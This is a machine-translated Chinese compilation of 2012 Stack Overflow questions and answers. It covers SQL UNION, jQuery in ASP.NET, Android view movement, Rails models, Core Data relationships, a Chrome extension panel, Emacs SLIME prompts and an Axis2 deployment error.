
## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:30:33.550

您想在同一个结果集上获得多个选择吗？如果是，你可以做

```
select column1, column2, column3 from table1
UNION ALL
select column1, column2, column3 from table2 
```

您可以根据需要多次合并，但当然您需要匹配两个选择的列。如果您只使用 UNION 它将删除重复的行。

# c# - 如何更改单击 asp.net 动态内容的图像路径

> ID：10102973
> 
> 赞同：1
> 
> 时间：2012-04-11T09:08:18.530
> 
> 标签：c#, jquery, asp.net

我正在使用 jquery 更改图像路径，但它不适用于 asp.net 动态内容

jquery函数是

```
$('img.selection').click(function () {

this.src = 'images/selected_img.png';
}); 
```

此函数不会发布到 C# 中，因此不会更改图像值。
请帮我...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:11:38.303

尝试这个 ：

```
$(this).attr("src", 'images/selected_img.png'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:17:10.580

问题可能在于发送到客户端时更改了 asp 控件 ID。

如果是这种情况，您可以通过多种方式解决此问题

1.  在 asp 中将您的控件上的 controlidmode 设置为 static。

2.  使用带有选择器的 jQuery 获取控件的 id：`$('[id$=theidnameofthecontrol]').click(function () ....`

你也不需要回发。如果您使用 jQuery 提供新 url，它应该加载它而无需回发。

# java - 找不到移动图像（或其他可点击对象）的方法

> ID：10102978
> 
> 赞同：-6
> 
> 时间：2012-04-11T09:08:28.407
> 
> 标签：java, android

```
 public class FirstTest extends Activity {
        public FirstTest() {
            // TODO Auto-generated constructor stub
        }

        RelativeLayout currentLayout;

        static int[] Deck = {
            R.drawable.img1,
            R.drawable.img2,
            R.drawable.img3,
            R.drawable.img4
        };

        /** Called when the activity is first created. */
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            currentLayout = new RelativeLayout(this);

            for (int i = 0; i < Deck.length; i++) {         
                ImageButton img = new ImageButton(this);
                img.setPadding(0, 0, 0, 0);
                img.setImageResource(Deck[i]);
                img.setAdjustViewBounds(true);
                img.setOnClickListener(new View.OnClickListener() {

                    public void onClick(View v) {
                        // TODO Auto-generated method stub

                        // BUT HOW MOVE THIS BUTTON????
                    }
                });

                currentLayout.addView(img);
            }
            setContentView(currentLayout);
        }
    } 
```

也许这对其他人来说是微不足道的，但我刚刚找到了 width 和 height 属性修饰符。在尝试了很多例子后，我放弃了。

我怎样才能搬东西？为什么我找不到 xy 属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-06T23:42:08.073

在您的评论中，您提到图像到达目的地时如何“闪烁”，然后您无疑将图像翻译设置为新位置。

经过大量测试，我发现移动图像（或任何视图）的最佳方法是按以下顺序执行步骤：

单击事件时： 1\. 找到您希望图像移动到的位置的坐标 2\. 将图像平移（设置位置）到您希望它完成的位置 3\. 从图像最初的位置开始动画，然后回到它的当前位置 (0,0)。

因为图像已移动到结束位置，然后立即开始动画，所以在动画开始时不会闪烁，所以当动画结束时，它将在图像已经设置的位置结束，所以你不会'最后也不会有任何闪烁。

这有点奇怪，但我相信这只是因为 Android 如何触发开始/结束动画事件。

我希望这是有道理的。

# database - 如何为 RoR 模型实现类似堆栈的信息

> ID：10102993
> 
> 赞同：1
> 
> 时间：2012-04-11T09:09:26.030
> 
> 标签：database, arrays, ruby-on-rails-3, stack

我需要在“事件”模型中添加一些关于“子事件”的信息。例如，事件可能是比赛，子事件可以是目标（我也需要跟踪前锋和分钟）、替换或其他。实现这一点的最佳方法是什么？我认为这不是为目标创建新模型的好解决方案，我希望所有信息都保留在 Match 模型中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T10:28:57.207

在我看来，创建`Goal`模型是一个很好的解决方案，它将`belongs_to`a`Match`和 a`Striker`并在它发生时（分钟）存储信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T10:35:56.217

也许它可以通过“属于它自己”的关联来完成。

看看这个：[Rails 3 - 一个与自身具有一对一关系的模型 - 我需要 belongs_to](https://stackoverflow.com/questions/6749611/rails-3-a-model-with-a-one-to-one-relationship-to-itself-do-i-need-belongs-t)

答案建议使用[ancestry gem](https://github.com/stefankroes/ancestry)或简单的 belongs_to 关联：

belongs_to :event, :foreign_key => "parent_event_id"

此外，在您的模型中，您应该添加“event_type”列并将“匹配”、“目标”或您想要的任何内容放在这里。

# objective-c - 实体之间的关系不持久

> ID：10102995
> 
> 赞同：-1
> 
> 时间：2012-04-11T09:09:31.667
> 
> 标签：objective-c, core-data, entity-relationship

在我的应用程序中，我有 Category 和 Sub_Category 实体，它们之间存在一对多关系。

首先，当应用程序第一次运行时，关系属性（category_subCategory）正在工作，如下所示：

```
2012-04-11 04:03:39.344 SupplyTrackerApp[27031:12f03] Saved
2012-04-11 04:03:47.423 SupplyTrackerApp[27031:fb03] Category<Category: 0x6ba4e90> (entity: Category; id: 0x6e95620 <x-coredata://00E5784E-D032-41DD-BD60-B85B0BBF8E31/Category/p1> ; data: {
    categoryID = 1;
    categoryName = Antiques;
    "category_SubCategory" =     (
        "0x6ebb4f0 <x-coredata://00E5784E-D032-41DD-BD60-B85B0BBF8E31/Sub_Category/p1>"
    );
    catetogoryDescription = "Contains a Sub categories related to Antique pieces";
}) 
```

但是当我退出应用程序并重新启动应用程序时，这种关系确实存在。输出看起来像这样..

```
2012-04-11 04:05:04.455 SupplyTrackerApp[27038:fb03] In Cell for row at index path
2012-04-11 04:05:05.548 SupplyTrackerApp[27038:fb03] Category<Category: 0x6ecaca0> (entity: Category; id: 0x6eb4ab0 <x-coredata://00E5784E-D032-41DD-BD60-B85B0BBF8E31/Category/p1> ; data: {
    categoryID = 1;
    categoryName = Antiques;
    "category_SubCategory" = "<relationship fault: 0x6ecf0a0 'category_SubCategory'>";
    catetogoryDescription = "Contains a Sub categories related to Antique pieces";
}) 
```

这是我调用创建实体的地方..

```
-(void) loadDataIntoDocument{

    NSLog(@"In Load Data");

    dispatch_queue_t fetch=dispatch_queue_create("Data Fetcher", NULL);

    dispatch_async(fetch, ^{

            [Sub_Category createSubCategory:context];

            NSError *error;

            if (![context save:&error]) {
                NSLog(@"Whoops, couldn't save: %@", [error localizedDescription]);
            }else {

                NSLog(@"Saved");
            }

    });

    dispatch_release(fetch);

} 
```

所以Sub_Category+Create Category文件有如下代码。

```
+(Sub_Category *) createSubCategory:(NSManagedObjectContext *)context{

    Sub_Category *subCategory=nil;

    NSFetchRequest *request=[NSFetchRequest fetchRequestWithEntityName:@"Sub_Category"];

    request.predicate=[NSPredicate predicateWithFormat:@"subCategoryID=%@", @"11"];

    NSSortDescriptor *sortDescriptor=[NSSortDescriptor sortDescriptorWithKey:@"subCategoryName" ascending:YES];

    request.sortDescriptors=[NSArray arrayWithObject:sortDescriptor];

    NSError *error;

    NSArray *matches=[context executeFetchRequest:request error:&error];

    if (!matches||[matches count]>1) {
        ///errorrrrrrrrrr
    } else if([matches count]==0) {

        subCategory=[NSEntityDescription insertNewObjectForEntityForName:@"Sub_Category" inManagedObjectContext:context];

        subCategory.subCategoryID=[NSString stringWithFormat:@"%i", 11];

        subCategory.subCategoryName=@"Antiquities";

        subCategory.subCategoryDescription=@"Contains several products related to antiquities";

        subCategory.subCategory_Category =[Category createCategory:context];

    }else {
        subCategory=[matches lastObject];
    }

    return subCategory;

} 
```

然后我调用具有以下代码的 Category+Create Category 文件。

```
+(Category *) createCategory:(NSManagedObjectContext *)context{

    Category *category=nil;

    NSFetchRequest *request=[NSFetchRequest fetchRequestWithEntityName:@"Category"];

    request.predicate=[NSPredicate predicateWithFormat:@"categoryID=%@", @"1"];

    NSSortDescriptor *sortDescriptor=[NSSortDescriptor sortDescriptorWithKey:@"categoryName" ascending:YES];

    request.sortDescriptors=[NSArray arrayWithObject:sortDescriptor];

    NSError *error;

    NSArray *matches=[context executeFetchRequest:request error:&error];

    if (!matches||[matches count]>1) {
        ///errorrrrrrrrrr
            } else if([matches count]==0) {

                category=[NSEntityDescription insertNewObjectForEntityForName:@"Category" inManagedObjectContext:context];

                category.categoryID=[NSString stringWithFormat:@"%d",1];

                category.categoryName=@"Antiques";

                category.catetogoryDescription=@"Contains a Sub categories related to Antique pieces";

            }else {
                category=[matches lastObject];
            }

    return category;

} 
```

任何人都可以帮我解决这个问题..

从几天开始我就被困在这个问题上......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:41:28.193

我看起来像你在后台`dispatch_async`做的。`-save:`这可能违反了处理 an 的“线程限制”规则`NSManagedObject`（简而言之，它们只能在创建它们的线程中使用。同样适用于从它们获取的任何对象）。

有关如何使用 Core Data 进行并发的更多信息，请参阅[此 WWDC 会话](https://developer.apple.com/videos/wwdc/2010/?id=118)。

仅尝试从主线程使用您的核心数据堆栈（以及您从中获取的任何对象）。

# javascript - Chrome 扩展：如何将扩展的 html 页面停靠到当前网页？

> ID：10102997
> 
> 赞同：2
> 
> 时间：2012-04-11T09:09:58.083
> 
> 标签：javascript, google-chrome-extension

我想开发一个 chrome 扩展，它将一个新面板停靠在当前网页的底部。GUI 应该类似于开发人员工具。

我试图像这样将 iframe 注入网页：

```
$('body').append(
    '<iframe src="'
    + chrome.extension.getURL('panel.html')
    + '" style="position: fixed; width: 100%; bottom: 0px; height: 300px; display: block;"></iframe>'); 
```

可以看到 iframe，但它覆盖了主页的内容。我该如何解决这个问题？希望有人能给我一些建议或简单的例子......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:58:37.820

因此，您无需调整底层页面，以使页面底部的 300 像素不会被面板覆盖。这是一些将页面底部提升 300px 的 javascript：

```
var html = document.documentElement;
//make sure <html> to the top of the page:
html.style.position = 'relative';
html.style.top = '0px';

window.onresize = function resizeFunc(){
  html.style.height = (window.innerHeight - 300) + 'px';
};
window.onresize(); 
```

此外，我建议不要像这样附加到正文：`$('body').append(`，我建议使用`document.documentElement`而不是`body`，甚至使用 vanilla javascript 来做一些基本的事情，这看起来像：

```
var iframe = document.createElement('iframe');
iframe.style = '<your style code above>';
iframe.src = chrome.extension.getURL('panel.html');
document.documentElement.appendChild(iframe); 
```

我认为这将解决您的问题...不确定您的页面是否有导致错误的独特内容

# emacs - emacs中的“中止”和“终止线程”有什么区别？

> ID：10102998
> 
> 赞同：2
> 
> 时间：2012-04-11T09:09:59.563
> 
> 标签：emacs, lisp, terminate, abort

当我使用 emacs 时，我的代码中经常会遇到一些错误。

当我的代码出现错误时，emacs 会询问我是要“中止”还是“终止线程”。

我想知道emacs中的“中止”和“终止线程”有什么区别。我应该选择哪一个会更好？

![在此处输入图像描述](../Images/064f1cfbcf50270da1f2c5dac2a3e283.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T14:16:21.977

我不认为这个问题来自 Emacs。所以请给我们更多信息（你运行 Emacs 的操作系统，你可能在 Emacs 中运行哪些进程，发生了什么样的错误，实际问题显示在哪里（在 Emacs 的 minibuffer 或一些弹出对话框中），......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-14T20:00:13.857

你在使用史莱姆吗？

在这种情况下，“abort”只会停止你的程序，而“terminate-thread”也会杀死 SLIME 正在与之交谈的 Lisp 线程。

# eclipse - Eclipse 中使用 Axis2 的 Web 服务：ClassNotFoundException

> ID：10102999
> 
> 赞同：1
> 
> 时间：2012-04-11T09:10:06.067
> 
> 标签：eclipse, web-services, axis2, noclassdeffounderror, classnotfoundexception

我一直在为 Eclipse 中的 Web 服务苦苦挣扎。每次我得到一些东西，它似乎只是基于运气，我已经尝试了很多方法。

我的最新问题涉及以下内容：我有一个使用大量外部引用（jar）的 java 应用程序。我使用 Fat-jar 插件 (http://fjep.sourceforge.net/) 将这个 java 项目导出到一个简单的 jar 文件，以确保导出的 jar 包含所有需要的资源。然后我创建了一个动态 Web 项目并将之前的 jar 添加到该项目中。当我进行一些基本测试时，一切正常，即 Eclipse 找到了所有需要的参考。

但是，当我尝试创建一个 Web 服务时，它的方法使用与测试完全相同的逻辑，我得到了错误。我不明白为什么会收到 ClassNotFoundException，因为就像我之前所说的，在进行本地测试时，Eclipse 会找到所有需要的资源。

```
[INFO] Deploying module: addressing-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/addressing-1.6.1.mar
[INFO] Deploying module: metadataExchange-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/mex-1.6.1.mar
[INFO] Deploying module: mtompolicy-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/mtompolicy-1.6.1.mar
[INFO] Deploying module: ping-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/ping-1.6.1.mar
[INFO] Deploying module: script-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/scripting-1.6.1.mar
[INFO] Deploying module: soapmonitor-1.6.1 - file:/C:/Users/Flamant/My     master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps    /org.openmarkov.webservice.engine/WEB-INF/modules/soapmonitor-1.6.1.mar
[INFO] The Engine service, which is not valid, caused java.lang.NoClassDefFoundError:     [Lorg/openmarkov/webservice/Finding;
    at java.lang.Class.getDeclaredMethods0(Native Method)
at java.lang.Class.privateGetDeclaredMethods(Unknown Source)
at java.lang.Class.privateGetPublicMethods(Unknown Source)
at java.lang.Class.getMethods(Unknown Source)
at org.apache.axis2.description.java2wsdl.bytecode.MethodTable.loadMethods(MethodTable.java:43)
at org.apache.axis2.description.java2wsdl.bytecode.MethodTable.<init>(MethodTable.java:33)
at org.apache.axis2.description.java2wsdl.DefaultSchemaGenerator.<init>(DefaultSchemaGenerator.java:141)
at org.apache.axis2.deployment.util.Utils.fillAxisService(Utils.java:453)
at org.apache.axis2.deployment.ServiceBuilder.populateService(ServiceBuilder.java:389)
at org.apache.axis2.deployment.repository.util.ArchiveReader.buildServiceGroup(ArchiveReader.java:101)
at org.apache.axis2.deployment.repository.util.ArchiveReader.processServiceGroup(ArchiveReader.java:178)
at org.apache.axis2.deployment.ServiceDeployer.deploy(ServiceDeployer.java:82)
at org.apache.axis2.deployment.repository.util.DeploymentFileData.deploy(DeploymentFileData.java:136)
at org.apache.axis2.deployment.DeploymentEngine.doDeploy(DeploymentEngine.java:813)
at org.apache.axis2.deployment.repository.util.WSInfoList.update(WSInfoList.java:144)
at org.apache.axis2.deployment.RepositoryListener.update(RepositoryListener.java:370)
at org.apache.axis2.deployment.RepositoryListener.checkServices(RepositoryListener.java:254)
at org.apache.axis2.deployment.DeploymentEngine.loadServices(DeploymentEngine.java:142)
at org.apache.axis2.deployment.WarBasedAxisConfigurator.loadServices(WarBasedAxisConfigurator.java:283)
at org.apache.axis2.context.ConfigurationContextFactory.createConfigurationContext(ConfigurationContextFactory.java:95)
at org.apache.axis2.transport.http.AxisServlet.initConfigContext(AxisServlet.java:584)
at org.apache.axis2.transport.http.AxisServlet.init(AxisServlet.java:454)
at org.apache.axis2.webapp.AxisAdminServlet.init(AxisAdminServlet.java:60)
at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1228)
at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1147)
at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1043)
at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:4957)
at org.apache.catalina.core.StandardContext$3.call(StandardContext.java:5284)
at org.apache.catalina.core.StandardContext$3.call(StandardContext.java:5279)
at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
at java.util.concurrent.FutureTask.run(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
at java.lang.Thread.run(Unknown Source)
Caused by: java.lang.ClassNotFoundException: org.openmarkov.webservice.Finding
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1678)
at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1523)
... 34 more

[INFO] org.apache.axis2.deployment.DeploymentException: java.lang.NoClassDefFoundError:     [Lorg/openmarkov/webservice/Finding;
[INFO] Deploying Web service: version.aar - file:/C:/Users/Flamant/My master/code/WorkspaceEclipse/.metadata/.plugins/org.eclipse.wst.server.core/tmp3/wtpwebapps/org.openmarkov.webservice.engine/WEB-INF/services/version.aar
[WARN] No transportReceiver for org.apache.axis2.transport.http.AxisServletListener found. An instance for HTTP will be configured automatically. Please update your axis2.xml file!
apr 11, 2012 10:51:45 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler ["http-bio-8081"]
apr 11, 2012 10:51:45 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler ["ajp-bio-8010"]
apr 11, 2012 10:51:45 AM org.apache.catalina.startup.Catalina start
INFO: Server startup in 1928 ms 
```

如果有人有想法，我将不胜感激。

谢谢，托马斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T15:00:59.600

实际上，您正面临 NoClassDefFoundError，当在运行时找不到所需的库时会发生这种情况...检查库是否在您的运行时类路径中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-01T14:16:19.363

确保至少有这些activation-1.1.jar、axiom-api-1.2.8.jar、axiom-dom-1.2.8.jar、axiom-impl-1.2.8.jar、axis2-adb-1.5.1.jar、 axis2-kernel-1.5.1.jar、axis2-transport-http-1.5.1.jar、axis2-transport-local-1.5.1.jar、commons-codec-1.3.jar、commons-fileupload-1.2.jar、 commons-httpclient-3.1.jar、commons-logging-1.1.1.jar、geronimo-stax-api_1.0_spec-1.0.1.jar、httpcore-4.0.jar、mail-1.4.jar、neethi-2.0.4。 jar、woden-api-1.0M8.jar、woden-impl-dom-1.0M8.jar、wsdl4j-1.6.2.jar、wstx-asl-3.2.4.jar、XmlSchema-1.4.3.jar

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-02T11:28:28.037

我也遇到了这个问题。就我而言，我没有清楚地遵循[[1]](http://www.eclipse.org/webtools/community/tutorials/BottomUpAxis2WebService/bu_tutorial.html)文章中的步骤。在第 12 步中，不要更改“服务项目”名称。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T09:24:09.363

您的意思是在 Eclipse 环境中您的 Web 服务工作正常，但在您的动态 Web 项目中不起作用？在您的动态 Web 项目中缺少 jar？